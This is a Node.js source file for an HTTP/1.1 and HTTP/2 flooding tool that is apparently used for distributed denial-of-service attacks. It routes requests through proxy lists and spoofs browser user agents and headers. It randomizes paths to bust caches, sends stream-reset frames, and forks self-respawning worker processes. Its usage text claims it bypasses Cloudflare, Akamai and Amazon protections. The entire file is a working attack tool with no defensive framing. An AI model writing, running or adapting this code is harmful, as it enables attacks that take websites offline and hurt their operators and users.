const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return false;
    })
    .on('unhandledRejection', function (e) {
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return false;
    })
    .on('warning', e => {
        if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return false;
    })
    .on("SIGHUP", () => { return 1; })
    .on("SIGCHILD", () => { return 1; });

// Các thiết lập redirect
const REDIRECT_SETTINGS = {
    MAX_FORWARDS: '0',
    CACHE_CONTROL: 'no-cache, no-store, must-revalidate',
    PRAGMA: 'no-cache',
    ACCEPT_ENCODING: 'identity',
    CONNECTION: 'keep-alive'
};

// Thống kê redirect
let redirectStats = {
    blocked301: 0,
    blocked302: 0,
    blocked307: 0,
    blocked308: 0,
    totalBlocked: 0
};

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456 * 10;
let custom_header = 262144 * 10;
let custom_update = 15663105 * 10;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

// Các tham số dòng lệnh
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const cdn = process.argv.indexOf('--cdn');
const cdn1 = cdn !== -1 && cdn + 1 < process.argv.length ? process.argv[cdn + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');

// NEW: Flag --randcache
const randcacheIndex = process.argv.indexOf('--randcache');
const randcache = randcacheIndex !== -1;

// NEW: Flag --font (bypass cache Amazon bằng cache-busting với query parameters)
const fontIndex = process.argv.indexOf('--font');
const font = fontIndex !== -1;

// *** NEW: Flag --connect ***
// Nếu có flag --connect, sẽ giữ kết nối proxy liên tục (không giới hạn thời gian)
const connectFlag = process.argv.includes('--connect');

const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length
    ? (process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]))
    : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

const redirectIndex = process.argv.indexOf('--redirect');
const blockRedirect = redirectIndex !== -1 && redirectIndex + 1 < process.argv.length
    ? process.argv[redirectIndex + 1].toLowerCase() === 'true'
    : false;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`Usage:   node bogus <GET/POST> <target> <time> <threads> <rate> <proxyfile>`);
    console.log(`Example: node bogus GET target 120 7 10 proxy.txt --cdn --delay 1 --full --http 2 --debug --query 1 --randcache --font`);
    
    console.error(`
    Options:
      --cdn:      (bypass website 2 document)
      --delay:    (delay between requests)
      --full:     (bypass cloudflare, akamai, amazon,...)
      --http:     (http version)
      --debug:    (show status code)
      --query:    (bypass cache 20%)
      --redirect: (true/false - Block all redirect attempts 301, 302, 307, 308)
      --randcache:(enable random path cache bypass techniques)
      --font:     (dùng cache-busting với query parameters để bypass cache của Amazon)
      --connect:  (nếu được đặt, giữ kết nối proxy liên tục, khi hết danh sách proxy thì tự động reconnect, bỏ qua proxy không phản hồi)
    `);
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    return alphabet[Math.floor(Math.random() * alphabet.length)];
};

var randomPathSuffix = '';
setInterval(() => { randomPathSuffix = `${getRandomChar()}`; }, 3333);
const url = new URL(target);
const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');

/* ========= Định nghĩa hàm lấy UA ngẫu nhiên ========= */
function getRandomWinChromeUA() {
    const version = Math.floor(Math.random() * (135 - 128 + 1)) + 128;
    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
}

function getRandomUserAgent() {
    const uas = [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.53 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TPS26.101) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 15; SM-G998B Build/QP1A.230405.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.99 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.98 Safari/537.36",
        getRandomWinChromeUA()
    ];
    return uas[Math.floor(Math.random() * uas.length)];
}
/* ========= End UA ========= */

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) return null;
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

/* ===================== RANDOM PATH CACHE FUNCTION ===================== */
function handleRandomPathCache(path) {
    const techniques = [
        () => path + "?cache_buster=" + generateRandomString(10, 20),
        () => path + "/" + generateRandomString(10, 20),
        () => path + "/../" + generateRandomString(5, 10),
        () => path + "%2F..%2F" + generateRandomString(5, 10)
    ];
    const selected = techniques[Math.floor(Math.random() * techniques.length)];
    return selected();
}
/* ========================================================================== */

// Hàm buildRequest cho HTTP/1.1
function buildRequest() {
    const browserVersion = getRandomInt(120, 128);
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    const isBrave = wfwf === 'Brave';
    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    const langValue = isBrave ? 'en-US,en;q=0.6' : 'en-US,en;q=0.7';

    let pathUsed;
    if (font) {
        pathUsed = url.pathname + (url.pathname.includes('?') ? '&' : '?') +
                   "bypass=" + generateRandomString(10, 20) + "&ts=" + Date.now();
    } else {
        pathUsed = randcache ? handleRandomPathCache(url.pathname) : url.pathname;
    }

    let mysor = '\r\n', mysor1 = '\r\n';

    let headers = `${reqmethod} ${pathUsed} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${getRandomUserAgent()}\r\n` + mysor1;

    return Buffer.from(headers, 'binary');
}

const h1payl = Buffer.concat(new Array(1).fill(buildRequest()));

function getRandomFileExtension() {
    const extensions = ['.php', '.js', '.css', '.html', '.json', '.xml'];
    return extensions[Math.floor(Math.random() * extensions.length)];
}

// Hàm buildRequestHeaders cho HTTP/2
function buildRequestHeaders(streamId) {
    let pathUsed;
    if (font) {
        pathUsed = url.pathname + (url.pathname.includes('?') ? '&' : '?') +
                   "bypass=" + generateRandomString(10, 20) + "&ts=" + Date.now();
    } else {
        pathUsed = randcache ? handleRandomPathCache(url.pathname) : (query ? handleQuery(query) : url.pathname + getRandomFileExtension());
    }
    const headers = {
        ":method": reqmethod,
        ":authority": url.hostname,
        ":scheme": "https",
        ":path": pathUsed,
        "max-forwards": "0",
        "cache-control": "no-cache, no-store, must-revalidate",
        "pragma": "no-cache",
        ...REDIRECT_SETTINGS
    };

    if (blockRedirect) {
        headers["accept-encoding"] = "identity";
        headers["connection"] = "keep-alive";
        headers["host"] = url.hostname;
    }

    return headers;
}

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: forceHttp === 1 ? ['http/1.1', 'http/1.0'] : forceHttp === 2 ? ['h2'] : (forceHttp === undefined ? (Math.random() >= 0.5 ? ['h2'] : ['http/1.1', 'http/1.0']) : ['h2']),
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSLcom,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }
                    function main() {
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => { main(); }, isFull ? 1000 : 1000 / ratelimit);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }
                    main();
                    tlsSocket.on('error', () => { tlsSocket.end(() => tlsSocket.destroy()); });
                    return;
                }
                if (forceHttp == 1) { tlsSocket.end(() => tlsSocket.destroy()); return; }
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);
                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);
                function randstra(length) {
                    const characters = "0123456789";
                    let result = "";
                    for (let i = 0; i < length; i++) {
                        result += characters.charAt(Math.floor(Math.random() * characters.length));
                    }
                    return result;
                }
                let oke = 13345, oke1 = 12346, oke2 = 12347;
                oke++; oke1++; oke2++;
                const frames1 = [];
                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.996 ? [[1, custom_table]] : [[1, oke]]),
                        [2, 0],
                        ...(Math.random() < 0.996 ? [[4, custom_window]] : [[4, oke1]]),
                        ...(Math.random() < 0.996 ? [[6, custom_header]] : [[6, oke2]])
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];
                frames1.push(...frames);
                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type == 1) {
                                const decodedHeaders = hpack.decode(frame.payload);
                                const status = decodedHeaders.find(x => x[0] == ':status')[1];
                                if (blockRedirect && (status === '301' || status === '302' || status === '307' || status === '308')) {
                                    const rstFrame = encodeFrame(frame.streamId, 0x3, Buffer.from([0x0, 0x0, 0x0, 0x8]), 0x0);
                                    tlsSocket.write(rstFrame);
                                    const newHeaders = buildRequestHeaders(frame.streamId + 2);
                                    const packed = Buffer.concat([
                                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                        hpack.encode(Object.entries(newHeaders))
                                    ]);
                                    const newStreamId = frame.streamId + 2;
                                    const newFrame = encodeFrame(newStreamId, 1, packed, 0x25);
                                    tlsSocket.write(newFrame);
                                    if (!statuses['blocked_redirect'])
                                        statuses['blocked_redirect'] = 0;
                                    statuses['blocked_redirect']++;
                                }
                                if (!statuses[status])
                                    statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7 && debugMode) {
                                    if (!statuses["GOAWAY"])
                                        statuses["GOAWAY"] = 0;
                                    statuses["GOAWAY"]++;
                                }
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else { break; }
                    }
                });
                function buildRequestHeaders(streamId) {
                    let pathUsed;
                    if (font) {
                        pathUsed = url.pathname + (url.pathname.includes('?') ? '&' : '?') +
                                   "bypass=" + generateRandomString(10, 20) + "&ts=" + Date.now();
                    } else {
                        pathUsed = randcache ? handleRandomPathCache(url.pathname) : (query ? handleQuery(query) : url.pathname + getRandomFileExtension());
                    }
                    const headers = {
                        ":method": reqmethod,
                        ":authority": url.hostname,
                        ":scheme": "https",
                        ":path": pathUsed,
                        "max-forwards": "0",
                        "cache-control": "no-cache, no-store, must-revalidate",
                        "pragma": "no-cache",
                        ...REDIRECT_SETTINGS
                    };
                    if (blockRedirect) {
                        headers["accept-encoding"] = "identity";
                        headers["connection"] = "keep-alive";
                        headers["host"] = url.hostname;
                    }
                    return headers;
                }
                tlsSocket.write(Buffer.concat(frames1));
                function main() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    let currentRate = (randrate !== undefined) ? getRandomInt(1, 64) : process.argv[6];
                    for (let i = 0; i < (isFull ? currentRate : 1); i++) {
                        const browserVersion = getRandomInt(120, 128);
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const isBrave = wfwf === 'Brave';
                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
                        const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
                        function randstra(length) {
                            const characters = "0123456789";
                            let result = "";
                            for (let i = 0; i < length; i++) {
                                result += characters.charAt(Math.floor(Math.random() * characters.length));
                            }
                            return result;
                        }
                        const a = getRandomInt(99,113);
                        const b = getRandomInt(100,9999);
                        const c = getRandomInt(10,99);
                        const ua = getRandomUserAgent();
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
                        
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": randcache ? handleRandomPathCache(url.pathname) : (query ? handleQuery(query) : url.pathname + getRandomFileExtension()),
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "upgrade-insecure-requests": "1",
                            "user-agent": ua,
                            "accept": acceptHeaderValue,
                            ...(isBrave && { "sec-ch-ua-platform": 'macOS' }),
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                        }).filter(a => a[1] != null);

                        const headers3 = Object.entries({
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": langValue,
                            ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${randstra(15)}-:-${randstra(6)}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = headers.concat(headers2).concat(headers3);
                        
                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + "?s=" + generateRandomString(10, 20);
                            } else if (query === '2') {
                                return url.pathname + '?q=' + generateRandomString(6) + '--' + generateRandomString(7);
                            } else if (query === '3') {
                                return url.pathname + "/" + generateRandomString(15, 30);
                            } else if (query === '4') {
                                return url.pathname + "/search?q=" + generateRandomString(15, 30);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        const flags = 0x0 | 0x1 | 0x2 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        const frame = Buffer.concat([encodedFrame]);
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                            const rstStreamFrame = encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
                            tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                            STREAMID_RESET = 0;
                        }
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        setTimeout(() => { main(); }, 1000 / ratelimit);
                    });
                }
                main();
            }).on('error', () => { tlsSocket.destroy(); });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) { tlsSocket.end(() => { tlsSocket.destroy(); go(); }); }
    });

    netSocket.on('error', (error) => { cleanup(error); });
    netSocket.on('close', () => { cleanup(); });
    function cleanup(error) {
        if (netSocket) { netSocket.destroy(); }
        if (tlsSocket) { tlsSocket.end(); }
    }
}

setInterval(() => { timer++; }, 0);
setInterval(() => {
    if (timer <= 10) {
        custom_header++;
        custom_window++;
        custom_table++;
        custom_update++;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(" \n   -> Target ( " + target + " ) \n   -> Time ( " + time + " seconds ) \n   -> Threads ( " + threads + " core ) \n   -> Ratelimit ( " + ratelimit + " rq/s ) \n   -> Proxies ( " + proxyfile + " ) \n");
    cluster.on('exit', (worker) => { cluster.fork({ core: worker.id % os.cpus().length }); });
    cluster.on('message', (worker, message) => { workers[worker.id] = [worker, message]; });
    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            statuses[code] = (statuses[code] || 0) + st[code];
                        }
                    }
                }
            }
            console.clear();
            console.log(new Date().toLocaleString('us'), statuses);
        }, 2000);
    }
    // Nếu không có flag --connect, kết thúc sau thời gian quy định
    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
} else {
    // Nếu có flag --connect thì không giới hạn số lần gọi hàm go()
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 30000) { 
                consssas++; 
            } else { 
                clearInterval(someee); 
                return; 
            }
            go();
        }, delay);
    }
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 2) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            try {
                if (process.connected) { process.send(statusesQ); }
            } catch (e) {
                if (e.code !== 'EPIPE') { throw e; }
                console.error('EPIPE error caught:', e);
            }
        }, 320);
    }
    // Nếu có flag --connect thì không kết thúc tự động, ngược lại kết thúc sau thời gian quy định
    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
}

process.stdout.on('error', (err) => {
    if (err.code === 'EPIPE') {
        console.error('[Warning] EPIPE error ignored');
        process.exit(0);
    }
});

process.stdout.on('error', (err) => {
    if (err.code === 'EPIPE') {
        console.error('[Warning] EPIPE error ignored');
    }
});

function safeLog(message) {
    if (!process.stdout.destroyed) {
        console.log(message);
    }
}

const { spawn } = require('child_process');
const child = spawn('some_command');
child.stdout.on('data', (data) => {
    try {
        process.stdout.write(data);
    } catch (err) {
        if (err.code !== 'EPIPE') throw err;
    }
});
